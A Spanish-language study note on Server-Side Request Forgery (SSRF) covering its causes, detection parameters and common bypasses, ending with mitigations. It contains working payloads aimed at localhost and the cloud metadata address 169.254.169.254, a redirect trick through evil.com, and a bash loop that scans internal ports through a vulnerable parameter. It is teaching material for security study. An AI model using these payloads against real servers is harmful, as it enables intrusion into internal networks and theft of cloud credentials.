
---
Tags: #ssrf #web #burpsuite #url #puertos #pivoting #fuzz #wfuzz #ffuf 

---
# Definición

> **SSRF** es una vulnerabilidad que permite a un atacante hacer que el servidor realice peticiones HTTP o de otro tipo a recursos internos o externos.

**Server-Side Request Forgery** ocurre cuando una aplicación web permite a los usuarios enviar solicitudes a otras direcciones a través del servidor. El atacante aprovecha esto para acceder a:

- Recursos internos del servidor (localhost).
    
- Servicios internos que no deberían estar expuestos.
    
- Otras máquinas de la misma red local o subred.
    

---

## 🧱 ¿Por qué ocurre?

Se produce cuando una aplicación acepta una **URL controlada por el usuario** y la usa sin validación en funciones como:
```php
file_get_contents("http://$url"); curl_exec($url);
```

o:

```php
GET_("url");
```

---

## 🎯 Objetivos de un ataque SSRF

|Objetivo|Descripción|
|---|---|
|📥 Leer recursos internos|Acceder a `localhost`, `127.0.0.1`, `169.254.169.254`, etc.|
|🕵️ Enumerar puertos|Identificar servicios en la red interna (`http://10.0.0.5:8080/`)|
|📦 Acceder a servicios internos|Explorar bases de datos, Redis, Elasticsearch, AWS metadata, etc.|
|🐍 Explotar servicios internos|Lanzar XSS, RCE, o inyecciones sobre servicios internos expuestos.|

---

## 🔍 Detección

### Parámetros sospechosos

Busca parámetros como:

`url= / link= / target= / next= / data= / redirect= / image= / domain=`

### Ejemplo de payloads comunes

`http://vulnerable-site.com/fetch.php?url=**http://127.0.0.1:80/** 
http://vulnerable.com/render?link=http://169.254.169.254/latest/meta-data/`

---

## 🧪 Técnicas de explotación

### 1. 📡 Acceso a recursos internos

```http
http://127.0.0.1:22/           # Puerto SSH http://localhost:3306/        # MySQL http://10.10.0.1:8080/admin   # Servicio interno en subred
```

### 3. 🔀 SSRF via redirección

Algunos SSRF permiten _open redirects_, redirigiendo primero a un dominio externo para luego llegar a un recurso interno:

`url=http://evil.com/redirect?to=http://localhost:22/`

---

## 🧪 Ejemplos prácticos


`# Escaneo de puertos internos desde SSRF for port in {1..100}; do   curl "http://victima.com/?url=http://127.0.0.1:$port" -s -o /dev/null -w "$port -> %{http_code}\n" done`

[!info] Se puede hacer fuzzing con Wfuzz, Ffuf, gobuster...

---

## ⚙️ Herramientas útiles

|Herramienta|Uso principal|
|---|---|
|`ssrfmap`|Automatiza la explotación de SSRF|
|`Burp Suite`|Interceptar y modificar parámetros URL|
|`Interactsh`|Recibir conexiones salientes desde SSRF|
|`httpx` / `nmap`|Mapear servicios descubiertos|

---

## 🧩 Bypasses comunes

|Técnica|Ejemplo|
|---|---|
|Usar IP numérica|`http://2130706433/` (equivale a 127.0.0.1)|
|DNS rebinding|`http://yourserver.evil.com -> 127.0.0.1`|
|URLs truncadas|`http://127.0.0.1@evil.com`|
|Doble encoding|`http://%31%32%37%2e%30%2e%30%2e%31/`|

---

## 🛡️ Mitigación

✅ Lista blanca de dominios permitidos  
✅ Bloquear direcciones IP internas (127.0.0.0/8, 10.0.0.0/8, etc.)  
✅ Validación de URLs con expresiones regulares  
✅ Deshabilitar redirecciones automáticas  
✅ Monitorización de tráfico saliente del servidor